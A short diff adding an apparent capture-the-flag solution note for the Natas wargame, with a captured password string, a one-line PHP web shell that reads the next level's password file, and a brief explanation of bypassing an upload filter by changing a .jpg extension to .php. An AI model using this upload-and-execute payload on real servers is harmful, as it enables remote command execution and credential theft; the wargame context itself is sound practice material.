@@ -1,0 +1,11 @@
+trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
+
+
+> cat hacked.php
+//<?php system('cat /etc/natas_webpass/natas13') ?>
+
+
+so I basically inspected the page and edited the html changing the file extension from .jpg to .php to enable the server to run my php script which reads the pass
+of natas13
+
+there you go
